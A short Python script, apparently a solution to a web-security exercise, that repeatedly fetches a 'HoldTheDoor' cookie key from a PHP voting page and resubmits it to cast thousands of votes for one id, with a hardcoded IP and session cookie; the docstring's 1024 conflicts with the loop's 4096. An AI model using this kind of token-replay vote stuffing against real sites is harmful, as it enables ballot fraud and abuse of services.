#!/usr/bin/python3
import requests
"""
    A program that votes 1024 times for your id
    in the url specified
"""


def main():

    url = 'http://158.69.76.135/level1.php'
    my_data = {'id': '1476', 'holdthedoor': 'Submit'}

    cookies = {
        'PHPSESSID': 'nj3vj0tjid2q6ok3j9j2mujts7',
    }

    for i in range(4096):
        res = requests.get(url)
        key = res.cookies['HoldTheDoor']
        my_data['key'] = str(key)
        cookies['HoldTheDoor'] = key
        # print(my_data)
        # print(cookies)
        res = requests.post(url, data=my_data, cookies=cookies)
        print(res.status_code)
        print(res.text)


if __name__ == "__main__":
    main()
